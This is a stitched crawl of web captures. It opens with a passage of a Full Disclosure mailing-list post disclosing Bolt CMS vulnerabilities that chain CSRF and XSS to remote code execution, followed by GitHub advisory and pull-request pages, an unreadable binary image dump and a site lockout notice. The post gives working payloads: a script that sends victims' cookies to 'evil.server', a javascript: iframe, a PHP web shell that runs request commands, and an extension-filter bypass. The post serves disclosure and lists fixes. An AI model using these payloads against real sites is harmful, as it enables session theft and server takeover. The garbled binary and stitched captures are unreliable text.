As shown above, $newName is initiated with value directly from the request,
without any validation or filtering. This allows an attacker to inject
javascript code in the name while renaming, making it vulnerable to stored
XSS.

A interesting thing is, if the server is hosted on Windows it is not
possible to create files with special characters like <, >. So if this
attack is tried on Bolt CMS that is hosted on Windows it will not work. But
Linux allows special characters in file names. So, this works only if the
application is hosted on a Linux machine.

--[ 03.3.2 - Exploitation

1. Create or upload a file.

2. Rename it to inject javascript code in it.
   For example,
   <script>document.write('<img
src="<https://evil.server/?cookie='+document.cookie+'"/>>')</script>
   This payload will send the victim's cookies to attacker's server

3. When the admin (or the victim user) visits the file management page, the
payload gets executed.

--[ 03.3.3 - References

[CVE-2020-4041] -
<https://github.com/bolt/bolt/security/advisories/GHSA-68q3-7wjp-7q3j>

--[ 03.4 - JS file upload

This stored XSS is a logical flaw in the application. By default in the
config.yml file, the application allows the following file types.

----[ code segment ]----

    accept_file_types: [ twig, html, js, css, scss, gif, jpg, jpeg, png,
    ico, zip, tgz, txt, md, doc, docx, pdf, epub, xls, xlsx, ppt, pptx, mp3,
    ogg, 1wav, m4a, mp4, m4v, ogv, wmv, avi, webm, svg ]

----[ code segment ]----

It can be seen that it allows js and HTML files.

--[ 03.4.1 - Exploitation

An attacker with permission to upload files can exploit this to to upload
an HTML file with some javascript in it or include the uploaded js file
into the HTML. When the victim visits the uploaded file, the javascript
code gets executed in the context of the victim.

--[ 03.5 - CKEditor4

Bolt CMS uses CKEditor4 in the blogs to get input. CKEditor4 by default
filters malicious HTML attributes but not the src attribute. So, it can be
exploited by using javscript URL in the src of an iframe. It is important
to not rely on CKEditor4 for XSS prevention since it is only a client side
filter, and not a server-side validator.

--[ 03.5.1 - Exploitation

To exploit this vulnerability, an attacker with permission to create/edit
blogs should,

1. Open the 'New Blog' page.

2. Select the 'source mode' in CKEditor4 and enter the payload
    <iframe src=javascript:alert(1)>

3. (optional) Switch back to WYSIWYG mode.

4. Post the blog.

When the victim visits the blog, the javascript code gets executed in the
context of the victim.

Now, all these XSS vulnerabilities on the surface look like simple
privilege escalation for an already authorized user, except for the preview
generator. But chaining these with the CSRF, any unauthorized attacker can
gain admin privileges, with little to no social engineering.

--[ 04 - Remote Code Execution

The application does not allow the upload of files with 'unsafe'
extensions, which include php and it's alternatives. But I bypassed this
protection by crafting a file name that abuses the sanitization functions.
An attacker with permissions to upload files can exploit this to upload php
files and execute code on the server.

This vulnerability was chained with the above mentioned CSRF and XSS to
achieve single-click RCE.

--[ 04.1 - Source code analysis

The function that validates the extension is validateFileExtension() which
is defined
invendor/bolt/bolt/src/Controller/Async/FilesystemManager.php:462

----[ code segment ]----

    private function validateFileExtension($filename)
    {
        // no UNIX-hidden files
        if ($filename[0] === '.') {
            return false;
        }
        // only whitelisted extensions
        $extension = pathinfo($filename, PATHINFO_EXTENSION);
        $allowedExtensions = $this->getAllowedUploadExtensions();

        return $extension === '' || in_array(mb_strtolower($extension),
    $allowedExtensions);
    }

----[ code segment ]----

As shown in the above code segment, the return value returns a value if the
extension is '' or if it is an allowed extension. The function allows
files with no extension. So, I tried to upload a file with the name
'backdoor.php.' The dot at the end makes the pathinfo() function return
null. So the file gets accepted. But when you open the file in the browser,
it does not execute it as php, but just as a plain text file.

The next step is to get the last dot removed.

Analyzing the rename() function defined in
vendor/bolt/filesystem/src/Filesystem.php:300, the function calls another
function normalizePath($newPath) with the new path as a parameter.

----[ code segment ]----

    public function rename($path, $newPath)
    {
        $path = $this->normalizePath($path);
        $newPath = $this->normalizePath($newPath);
        $this->assertPresent($path);
        $this->assertAbsent($newPath);

        $this->doRename($path, $newPath);
    }

----[ code segment ]----

The normalizePath() function is defined in the same file in line 823, acts
as a wrapper to Flysystem's normalizePath() function. It is being used to
fetch the 'real' path of files. This is used to validate the file location
etc. For example,

./somedir/../text.txt == ./text.txt == text.txt

So when './text.txt' is passed to this function, it returns 'text.txt'

So, to remove the last dot from our file name 'backdoor.php.', I changed it
to 'backdoor.php/.' Passing it to normalizePath() it returns 'backdoor.php',
which is exactly what is needed.

So the data flow looks like, first the value 'backdoor.php/.' is passed to
validateFileExtension() which returns NULL because there is no text after
that last dot. So, the extesion filter is bypassed. Next, the same value is
passed to normalizePath() which removes the last '/.' because it looks like
it's a path to the current directory. At the end, the file gets renamed to
'backdoor.php'

Pwned!

--[ 04.2 - Exploitation

To exploit this vulnerability, an attacker with permission to upload files
should,

1. Create a php file with code that gives a backdoor.
    For example,
    <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd =
($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

2. Rename the file with a dot at the end.
    For example,
    'backdoor.php.'

3. Upload the file and rename it to 'backdoor.php/.'
    You will notice that it will get renamed to 'backdoor.php'

--[ 04.3 - References
<https://stazot.com/boltcms-file-upload-bypass>

--[ 05 - Solution

1. Validate the CSRF token before generating preview in preview() function
- vendor/bolt/bolt/src/Controller/Frontend.php:200

2. Validate the user inputs to the preview generation endpoint before
displaying them in preview() function -
vendor/bolt/bolt/src/Controller/Frontend.php:200

3. Use the variable that has the encoded value to display user information.
i.e., use $userEntity instead of $user in -
vendor/bolt/bolt/src/Controller/Backend/Users.php:279

4. Validate the user inputs before renaming the files in renameFile()
function in - /src/Controller/Async/FilesystemManager.php:335

5. Do not allow the upload of JS and HTML files. If that is absolutely
required, then add it as a separate permission that the admin can allocate
to certain roles and not everyone who has access to file upload.

6. Enable CKEditor4's option to disallow javascript URLs. For more
information, check<https://ckeditor.com/docs/ckeditor4/latest/api/CKEDITOR_config.html#cfg-linkJavaScriptLinksAllowed>

7. Change the flow of data while renaming. First pass the data through
normalizePath() data and then through validateFileExtension(). That way,
the validation function validates the final value.

--[ 06 - Contact

Name   : Sivanesh Ashok

Twitter: @sivaneshashok

Website: <https://stazot.com>

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

### Current thread:

* **Bolt CMS <= 3.7.0 Multiple Vulnerabilities - CSRF to RCE** *Sivanesh Ashok (Jul 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from avatars.githubusercontent.com_6860a7f8_20250119_140525.html ===
���� �  

 $.' ",#(7),01444'9=82<.342 
2!!22222222222222222222222222222222222222222222222222��  ( (" ���          
   } !1AQa"q2���#B��R��$3br�
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz�������������������������������������������������������������������������       
  w !1AQaq"2�B���� #3R�br�
$4�%�&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? �M2h��+s����rG^+3Q�7٥m7N�$q��p�1a���OҶ4�Ɩ{���1�x�%���ow�^ّ��H�4,[�������W���m�l����:޷yw�;��H��=(�5G7�.t�itF\�����Vz~�m'��Y�A��C��a��k�5��.c�9���gvq���{VӬ��������N{K�.�/E݌�/�l����� ��Q� ��� �+��6����jw�s�F�>M7�2�2VGC��ɤ�¬q�!�
�Ɲ�i2l��n��8]����=@��޽2
MM�������:���S��ʨ��[ݏ6>p0C���e,��n̿m�v<��X�-50$����q��ү�����e � ��\*�^���}}+f�L��^��g���>��]���hױ��,�G<=ŶE>�pW<%IS厌u+Ž6<��IX�!��9v�O�C� =\_�SӤӤ���N#}�<o^�~��a�����^k�֝����^u��q�s��z� ����O�+������m���^ys� !?���]V�� �\_F��iO"��O)X篵M�P3{����=��#� T�J�2�ė3FA8< 2X�8�pEg� �-y� >w���¶�� �֙� \_sJ�Ω���I��v�G��

=== Content from github.com_195ec0ad_20250119_140526.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbolt%2Fbolt%2Fsecurity%2Fadvisories%2FGHSA-68q3-7wjp-7q3j)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbolt%2Fbolt%2Fsecurity%2Fadvisories%2FGHSA-68q3-7wjp-7q3j)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=bolt%2Fbolt)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[bolt](/bolt)
/
**[bolt](/bolt/bolt)**
Public

* [Notifications](/login?return_to=%2Fbolt%2Fbolt) You must be signed in to change notification settings
* [Fork
  817](/login?return_to=%2Fbolt%2Fbolt)
* [Star
   4.2k](/login?return_to=%2Fbolt%2Fbolt)

* [Code](/bolt/bolt)
* [Issues
  51](/bolt/bolt/issues)
* [Pull requests
  5](/bolt/bolt/pulls)
* [Actions](/bolt/bolt/actions)
* [Projects
  0](/bolt/bolt/projects)
* [Wiki](/bolt/bolt/wiki)
* [Security](/bolt/bolt/security)
* [Insights](/bolt/bolt/pulse)

Additional navigation options

* [Code](/bolt/bolt)
* [Issues](/bolt/bolt/issues)
* [Pull requests](/bolt/bolt/pulls)
* [Actions](/bolt/bolt/actions)
* [Projects](/bolt/bolt/projects)
* [Wiki](/bolt/bolt/wiki)
* [Security](/bolt/bolt/security)
* [Insights](/bolt/bolt/pulse)

# The filename of uploaded files vulnerable to stored XSS

Moderate

[bobdenotter](/bobdenotter)
published
GHSA-68q3-7wjp-7q3j
Jun 8, 2020

## Package

No package listed

## Affected versions

< 3.7.1

## Patched versions

3.7.1

## Description

### Impact

The filename of uploaded files was vulnerable to stored XSS. It is not possible to inject javascript code in the file name when creating/uploading the file. But, once created/uploaded, it can be renamed to inject the payload in it.

Additionally, the measures to prevent renaming the file to disallowed filename extensions could be circumvented.

### Patches

This is fixed in Bolt 3.7.1.

### References

Related issue: [#7853](https://github.com/bolt/bolt/pull/7853)

### Severity

Moderate

### CVE ID

CVE-2020-4041

### Weaknesses

No CWEs

### Credits

* [![@staz0t](https://avatars.githubusercontent.com/u/26545664?s=40&v=4)](/staz0t)
  [staz0t](/staz0t)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_8c5c6a05_20250119_140525.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbolt%2Fbolt%2Fpull%2F7853)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbolt%2Fbolt%2Fpull%2F7853)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=bolt%2Fbolt)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[bolt](/bolt)
/
**[bolt](/bolt/bolt)**
Public

* [Notifications](/login?return_to=%2Fbolt%2Fbolt) You must be signed in to change notification settings
* [Fork
  817](/login?return_to=%2Fbolt%2Fbolt)
* [Star
   4.2k](/login?return_to=%2Fbolt%2Fbolt)

* [Code](/bolt/bolt)
* [Issues
  51](/bolt/bolt/issues)
* [Pull requests
  5](/bolt/bolt/pulls)
* [Actions](/bolt/bolt/actions)
* [Projects
  0](/bolt/bolt/projects)
* [Wiki](/bolt/bolt/wiki)
* [Security](/bolt/bolt/security)
* [Insights](/bolt/bolt/pulse)

Additional navigation options

* [Code](/bolt/bolt)
* [Issues](/bolt/bolt/issues)
* [Pull requests](/bolt/bolt/pulls)
* [Actions](/bolt/bolt/actions)
* [Projects](/bolt/bolt/projects)
* [Wiki](/bolt/bolt/wiki)
* [Security](/bolt/bolt/security)
* [Insights](/bolt/bolt/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fbolt%2Fbolt%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fbolt%2Fbolt%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Check CSRF on Preview page #7853

 Merged

[bobdenotter](/bobdenotter)
merged 3 commits into
[3.7](/bolt/bolt/tree/3.7 "bolt/bolt:3.7")
from
[fix/csrf-check-on-preview](/bolt/bolt/tree/fix/csrf-check-on-preview "bolt/bolt:fix/csrf-check-on-preview")

May 7, 2020

 Merged

# [Check CSRF on Preview page](#top) #7853

[bobdenotter](/bobdenotter)
merged 3 commits into
[3.7](/bolt/bolt/tree/3.7 "bolt/bolt:3.7")
from
[fix/csrf-check-on-preview](/bolt/bolt/tree/fix/csrf-check-on-preview "bolt/bolt:fix/csrf-check-on-preview")

May 7, 2020

[Conversation
0](/bolt/bolt/pull/7853)
[Commits
3](/bolt/bolt/pull/7853/commits)
[Checks
0](/bolt/bolt/pull/7853/checks)
[Files changed](/bolt/bolt/pull/7853/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![bobdenotter](https://avatars.githubusercontent.com/u/1833361?s=60&v=4)](/bobdenotter)

Copy link

Member

### @bobdenotter **[bobdenotter](/bobdenotter)** commented [May 7, 2020](#issue-614008194)

.

Sorry, something went wrong.

All reactions

 [bobdenotter](/bobdenotter)
added 3 commits
[May 7, 2020 14:11](#commits-pushed-25d0e85)

[![@bobdenotter](https://avatars.githubusercontent.com/u/1833361?s=40&v=4)](/bobdenotter)

`[Check CSRF on Preview page](/bolt/bolt/pull/7853/commits/25d0e853b0a301d99ac5b82bb6e9e366d42ffdf0 "Check CSRF on Preview page")`

`[25d0e85](/bolt/bolt/pull/7853/commits/25d0e853b0a301d99ac5b82bb6e9e366d42ffdf0)`

[![@bobdenotter](https://avatars.githubusercontent.com/u/1833361?s=40&v=4)](/bobdenotter)

`[Update FilesystemManagerTest.php](/bolt/bolt/pull/7853/commits/1ca91d974a44b9d168ad79fb8534d36ff5b910d2 "Update FilesystemManagerTest.php")`

`[1ca91d9](/bolt/bolt/pull/7853/commits/1ca91d974a44b9d168ad79fb8534d36ff5b910d2)`

[![@bobdenotter](https://avatars.githubusercontent.com/u/1833361?s=40&v=4)](/bobdenotter)

`[More test fixes.](/bolt/bolt/pull/7853/commits/aba99d2744dac846bd6c4617ddd64223c5e6f2f7 "More test fixes.")`

`[aba99d2](/bolt/bolt/pull/7853/commits/aba99d2744dac846bd6c4617ddd64223c5e6f2f7)`

[![@bobdenotter](https://avatars.githubusercontent.com/u/1833361?s=40&u=54038070df0aa37024506235e85adc8d9743d691&v=4)](/bobdenotter)
[bobdenotter](/bobdenotter)
merged commit [`b42cbfc`](/bolt/bolt/commit/b42cbfcf3e3108c46a80581216ba03ef449e419f)
into
3.7

[May 7, 2020](https://github.com/bolt/bolt/pull/7853#event-3312880983)

 [![@bobdenotter](https://avatars.githubusercontent.com/u/1833361?s=40&u=54038070df0aa37024506235e85adc8d9743d691&v=4)](/bobdenotter)
[bobdenotter](/bobdenotter)
deleted the
fix/csrf-check-on-preview

branch
[May 7, 2020 13:24](#event-3312881238)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fbolt%2Fbolt%2Fpull%2F7853)

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

1 participant

[![@bobdenotter](https://avatars.githubusercontent.com/u/1833361?s=52&v=4)](/bobdenotter)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from packetstormsecurity.com_130e5a09_20250119_122652.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.
